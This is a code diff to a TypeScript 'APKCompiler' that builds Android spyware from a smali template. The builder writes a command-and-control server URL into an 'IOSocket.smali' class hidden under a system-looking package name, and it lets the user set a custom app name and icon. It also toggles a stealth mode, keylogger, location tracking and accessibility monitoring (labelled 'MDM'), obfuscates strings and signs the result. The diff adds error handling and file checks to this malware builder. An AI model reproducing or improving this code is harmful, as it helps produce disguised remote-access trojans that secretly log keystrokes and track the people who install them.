@@ -74,12 +74,41 @@ class APKCompiler {
       console.log(`[APKCompiler] Usando Java portátil desde: ${localJava}`);
       return `"${localJava}"`;
     }
-    console.log(`[APKCompiler] Java portátil no encontrado en ${localJava}. Usando fallback global 'java'`);
-    return "java";
+    // Verificar si java global está disponible
+    try {
+      execSync(`java -version 2>&1`, { stdio: "pipe" });
+      console.log(`[APKCompiler] Usando Java global del sistema`);
+      return "java";
+    } catch (e) {
+      console.error(`[APKCompiler] Java no encontrado! Instala JDK 17.`);
+      return "java"; // Intentar de todas formas
+    }
   }
 
   /**
-   * Preparar el proyecto temporal para compilar - usando APK base directo
+   * Verificar que los archivos requeridos existan
+   */
+  private verifyTemplate(): boolean {
+    const templateDir = join(this.assetsDir, "apk-template");
+    const required = [
+      join(templateDir, "AndroidManifest.xml"),
+      join(templateDir, "apktool.yml"),
+      join(templateDir, "res"),
+      join(templateDir, "smali"),
+      join(templateDir, "build", "apk", "classes.dex"),
+    ];
+    
+    for (const file of required) {
+      if (!existsSync(file)) {
+        console.error(`[APKCompiler] Archivo requerido no existe: ${file}`);
+        return false;
+      }
+    }
+    return true;
+  }
+
+  /**
+   * Preparar el proyecto temporal para compilar
    */
   private async prepareProject(config: CompilationConfig, logs: string[]): Promise<string> {
     const buildIdDir = join(this.buildDir, `build-${config.buildId}`);
@@ -94,70 +123,28 @@ class APKCompiler {
     }
     mkdirSync(tempProjectDir, { recursive: true });
 
-    // 1. COPIAR APK BASE directamente (más confiable que recompilar smali)
-    const baseApkPath = join(this.assetsDir, "apk-template", "build", "apk");
     const templateDir = join(this.assetsDir, "apk-template");
     
+    // Verificar que el template esté completo
+    if (!this.verifyTemplate()) {
+      throw new Error("Template APK incompleto. Faltan archivos requeridos.");
+    }
+    
+    // Copiar estructura completa del template
+    logs.push(`[SETUP] Copiando estructura del template...`);
     try {
       if (process.platform === "win32") {
-        execSync(`powershell -Command "Copy-Item -Path '${baseApkPath}\\*' -Destination '${tempProjectDir}' -Recurse -Force"`);
+        execSync(`powershell -Command "Copy-Item -Path '${templateDir}\\*' -Destination '${tempProjectDir}' -Recurse -Force"`);
       } else {
-        execSync(`cp -r "${baseApkPath}/." "${tempProjectDir}"`);
+        execSync(`cp -r "${templateDir}/." "${tempProjectDir}"`);
       }
-      logs.push(`[BASE] APK base copiado desde: ${baseApkPath}`);
+      logs.push(`[OK] Template copiado`);
     } catch (e) {
-      console.error("[APKCompiler] Error copying APK base:", e);
+      console.error("[APKCompiler] Error copying template:", e);
       throw e;
     }
 
-    // 2. Decompilar con apktool para poder modificar smali
-    logs.push(`[${new Date().toISOString()}] Decompilando APK base con Apktool...`);
-    const tempDecompile = join(buildIdDir, "decompiled");
-    mkdirSync(tempDecompile, { recursive: true });
-    
-    try {
-      execSync(`${this.getJavaCommand()} -jar "${this.apktoolPath}" d "${join(tempProjectDir, "classes.dex")}" -o "${tempDecompile}" -f`, { stdio: "pipe" });
-      logs.push(`[OK] APK decompilado exitosamente`);
-      
-      // Copiar decompilado al projectDir
-      if (process.platform === "win32") {
-        execSync(`powershell -Command "Remove-Item -Path '${tempProjectDir}' -Recurse -Force; Copy-Item -Path '${tempDecompile}' -Destination '${tempProjectDir}' -Recurse -Force"`);
-      } else {
-        execSync(`rm -rf "${tempProjectDir}" && cp -r "${tempDecompile}" "${tempProjectDir}"`);
-      }
-    } catch (e) {
-      logs.push(`[WARN] Decompile falló, usando smali directo del template`);
-      // Si falla decompile, usar smali del template
-      if (process.platform === "win32") {
-        execSync(`powershell -Command "Remove-Item -Path '${tempProjectDir}' -Recurse -Force; Copy-Item -Path '${templateDir}\smali' -Destination '${tempProjectDir}' -Recurse -Force"`);
-      } else {
-        execSync(`rm -rf "${tempProjectDir}" && cp -r "${templateDir}/smali" "${tempProjectDir}"`);
-      }
-    }
-
-    // 3. Copiar recursos del template
-    try {
-      if (process.platform === "win32") {
-        execSync(`powershell -Command "Copy-Item -Path '${templateDir}\res' -Destination '${tempProjectDir}' -Recurse -Force"`);
-      } else {
-        execSync(`cp -r "${templateDir}/res" "${tempProjectDir}"`);
-      }
-    } catch (e) {
-      logs.push(`[WARN] Error copiando recursos: ${e}`);
-    }
-
-    // 4. Copiar AndroidManifest.xml
-    try {
-      if (process.platform === "win32") {
-        execSync(`powershell -Command "Copy-Item -Path '${templateDir}\AndroidManifest.xml' -Destination '${tempProjectDir}'"`);
-      } else {
-        execSync(`cp "${templateDir}/AndroidManifest.xml" "${tempProjectDir}"`);
-      }
-    } catch (e) {
-      logs.push(`[WARN] Error copiando manifest: ${e}`);
-    }
-
-    // 5. Inyectar URL en IOSocket.smali si existe
+    // Inyectar URL en IOSocket.smali
     const ioSocketPath = join(tempProjectDir, "smali", "com", "system", "android", "ui", "IOSocket.smali");
     if (existsSync(ioSocketPath)) {
       let content = readFileSync(ioSocketPath, "utf8");
@@ -186,8 +173,7 @@ class APKCompiler {
       const finalRawUrl = serverUrl.split('?')[0].replace(/\/$/, "");
       const secureInjectedUrl = encodeUrl(finalRawUrl);
       
-      logs.push(`[DEBUG] URL a inyectar: ${finalRawUrl}`);
-      logs.push(`[DEBUG] URL en Base64: ${secureInjectedUrl}`);
+      logs.push(`[URL] Injecting: ${finalRawUrl}`);
       
       const smaliLines = content.split('\n');
       let found = false;
@@ -197,31 +183,77 @@ class APKCompiler {
         if (match) {
           smaliLines[i] = line.replace(match[0], `${match[1]} ${match[2]}, "${secureInjectedUrl}"`);
           found = true;
-          logs.push(`[OK] URL inyectada en línea ${i + 1}`);
+          logs.push(`[OK] URL injected at line ${i + 1}`);
           break;
         }
       }
       
       if (!found) {
         content = content.replace(/C2_HOST_LINK_HERE/g, secureInjectedUrl);
-        logs.push(`[WARN] Placeholder no encontrado, reemplazo global`);
+        logs.push(`[WARN] Placeholder not found, global replace`);
       }
       
       writeFileSync(ioSocketPath, smaliLines.join('\n'));
+    } else {
+      logs.push(`[WARN] IOSocket.smali not found at: ${ioSocketPath}`);
     }
 
-    // 6. Modificar App Name en strings.xml si existe
+    // Modificar App Name en strings.xml
     const stringsPath = join(tempProjectDir, "res", "values", "strings.xml");
     if (existsSync(stringsPath)) {
       try {
         let content = readFileSync(stringsPath, "utf8");
         content = content.replace(/<string name="app_name">.*?<\/string>/, `<string name="app_name">${config.appName}</string>`);
         writeFileSync(stringsPath, content);
+        logs.push(`[OK] App name updated: ${config.appName}`);
       } catch (e) {
-        logs.push(`[WARN] Error actualizando app_name: ${e}`);
+        logs.push(`[WARN] Error updating app_name: ${e}`);
+      }
+    } else {
+      logs.push(`[WARN] strings.xml not found`);
+    }
+
+    // Inyectar icono si se proporciona
+    if (config.iconUrl) {
+      try {
+        logs.push(`[ICON] Downloading custom icon...`);
+        const response = await axios.get(config.iconUrl, { responseType: 'arraybuffer' });
+        const iconBuffer = Buffer.from(response.data);
+
+        const resDir = join(tempProjectDir, "res");
+        if (existsSync(resDir)) {
+          const mipmapDirs = readdirSync(resDir).filter(d => d.startsWith("mipmap-"));
+          
+          for (const dir of mipmapDirs) {
+            const targetDir = join(resDir, dir);
+            const iconTargets = ["ic_launcher.png", "ic_launcher_round.png"];
+            for (const target of iconTargets) {
+              const targetPath = join(targetDir, target);
+              if (existsSync(targetPath)) {
+                writeFileSync(targetPath, iconBuffer);
+              }
+            }
+          }
+          logs.push(`[OK] Custom icon injected`);
+        }
+      } catch (e) {
+        logs.push(`[WARN] Error downloading icon: ${e}`);
       }
     }
 
+    // Inyectar stealth mode flag
+    if (config.stealthMode) {
+      if (existsSync(stringsPath)) {
+        let content = readFileSync(stringsPath, "utf8");
+        if (!content.includes("stealth_mode_enabled")) {
+          content = content.replace("</resources>", `  <string name="stealth_mode_enabled">true</string>\n</resources>`);
+          writeFileSync(stringsPath, content);
+        }
+      }
+      logs.push(`[STEALTH] Mode configured`);
+    }
+
+    logs.push(`[OK] Project prepared: ${tempProjectDir}`);
     return tempProjectDir;
   }
 
@@ -232,26 +264,27 @@ class APKCompiler {
     const buildIdDir = join(this.buildDir, `build-${config.buildId}`);
 
     try {
-      logs.push(`[${new Date().toISOString()}] Iniciando construcción APK...`);
-      logs.push(`Configuración: ${config.appName} | ${config.packageName}`);
+      logs.push(`[BUILD] Starting APK build...`);
+      logs.push(`[BUILD] Config: ${config.appName} | ${config.packageName}`);
+      logs.push(`[BUILD] Java: ${this.getJavaCommand()}`);
       
       const projectDir = await this.prepareProject(config, logs);
-      logs.push(`[OK] Proyecto preparado`);
+      logs.push(`[OK] Project ready`);
 
       // Inyectar características personalizadas
       if (config.enableKeylogger || config.enableActiveTracking || config.enableAccessibilityMonitor) {
-        logs.push(`[${new Date().toISOString()}] Configurando features MDM...`);
+        logs.push(`[MDM] Configuring MDM features...`);
         await this.injectMDMFeatures(projectDir, config, logs);
       }
 
       // Obfuscación básica
       if (config.obfuscate) {
-        logs.push(`[${new Date().toISOString()}] Aplicando protección...`);
+        logs.push(`[OBFUSCATE] Applying basic obfuscation...`);
         await this.removeDebugInfo(projectDir, logs);
         await this.obfuscateStrings(projectDir, logs);
       }
 
-      // Stealth mode - no ocultar inmediatamente
+      // Stealth mode
       if (config.stealthMode) {
         const stringsPath = join(projectDir, "res", "values", "strings.xml");
         if (existsSync(stringsPath)) {
@@ -261,31 +294,71 @@ class APKCompiler {
             writeFileSync(stringsPath, content);
           }
         }
-        logs.push("[Stealth] Mode configurado - app visible inicialmente");
+        logs.push(`[STEALTH] Mode configured`);
+      }
+
+      // Verificar que el proyecto esté listo
+      const manifestPath = join(projectDir, "AndroidManifest.xml");
+      const smaliDir = join(projectDir, "smali");
+      if (!existsSync(manifestPath)) {
+        throw new Error("AndroidManifest.xml not found after preparation");
+      }
+      if (!existsSync(smaliDir)) {
+        throw new Error("smali directory not found after preparation");
       }
 
       // Compilar con Apktool
       const unsignedApk = join(buildIdDir, "unsigned.apk");
-      logs.push(`[${new Date().toISOString()}] Compilando con Apktool...`);
-      execSync(`${this.getJavaCommand()} -jar "${this.apktoolPath}" b "${projectDir}" -o "${unsignedApk}"`, { stdio: "pipe" });
+      logs.push(`[COMPILE] Running Apktool...`);
+      
+      try {
+        execSync(`${this.getJavaCommand()} -jar "${this.apktoolPath}" b "${projectDir}" -o "${unsignedApk}"`, { stdio: "pipe" });
+        logs.push(`[OK] Apktool compiled APK`);
+      } catch (compileError: any) {
+        logs.push(`[ERROR] Apktool failed: ${compileError.message || compileError}`);
+        throw new Error(`Apktool compilation failed: ${compileError.message || compileError}`);
+      }
+
+      if (!existsSync(unsignedApk)) {
+        throw new Error("APK compilation failed - output file not created");
+      }
 
       // Firmar APK
-      logs.push(`[${new Date().toISOString()}] Firmando APK...`);
+      logs.push(`[SIGN] Signing APK...`);
       const uberSignerPath = join(this.assetsDir, "uber-apk-signer.jar");
-      execSync(`${this.getJavaCommand()} -jar "${uberSignerPath}" -a "${unsignedApk}" -o "${buildIdDir}" 2>&1`, { stdio: "pipe" });
+      
+      try {
+        execSync(`${this.getJavaCommand()} -jar "${uberSignerPath}" -a "${unsignedApk}" -o "${buildIdDir}" 2>&1`, { stdio: "pipe" });
+        logs.push(`[OK] APK signed`);
+      } catch (signError: any) {
+        logs.push(`[ERROR] Signing failed: ${signError.message || signError}`);
+        throw new Error(`APK signing failed: ${signError.message || signError}`);
+      }
       
       const signedTempApk = join(buildIdDir, "unsigned-aligned-debugSigned.apk");
       const finalSignedApk = join(buildIdDir, `${config.appName.replace(/[^a-zA-Z0-9]/g, "_")}.apk`);
+      
       if (existsSync(signedTempApk)) {
           renameSync(signedTempApk, finalSignedApk);
+          logs.push(`[OK] APK renamed: ${basename(finalSignedApk)}`);
+      } else {
+        // Buscar cualquier APK firmado
+        const apkFiles = readdirSync(buildIdDir).filter(f => f.endsWith(".apk"));
+        if (apkFiles.length > 0) {
+          const foundApk = join(buildIdDir, apkFiles[0]);
+          renameSync(foundApk, finalSignedApk);
+          logs.push(`[OK] APK found and renamed: ${apkFiles[0]}`);
+        } else {
+          throw new Error("Signed APK not found");
+        }
       }
 
       if (!existsSync(finalSignedApk)) {
-        throw new Error("El APK no se generó correctamente.");
+        throw new Error("APK build failed - final file not created");
       }
 
-      logs.push(`[${new Date().toISOString()}] ¡APK generado!`);
-      const compilationTime = Date.now() - startTime;
+      const fileSize = statSync(finalSignedApk).size;
+      logs.push(`[SUCCESS] APK generated: ${basename(finalSignedApk)} (${(fileSize / 1024 / 1024).toFixed(2)} MB)`);
       
       await this.updateBuildStatus(config.buildId, "ready", finalSignedApk, logs);
 
@@ -294,12 +367,12 @@ class APKCompiler {
         buildId: config.buildId,
         apkPath: finalSignedApk,
         logs,
-        compilationTime,
+        compilationTime: Date.now() - startTime,
       };
 
     } catch (error) {
       const errorMsg = error instanceof Error ? error.message : String(error);
-      logs.push(`[ERROR] ${errorMsg}`);
+      logs.push(`[FAIL] ${errorMsg}`);
       await this.updateBuildStatus(config.buildId, "failed", undefined, logs, errorMsg);
       return { success: false, buildId: config.buildId, error: errorMsg, logs, compilationTime: Date.now() - startTime };
     }
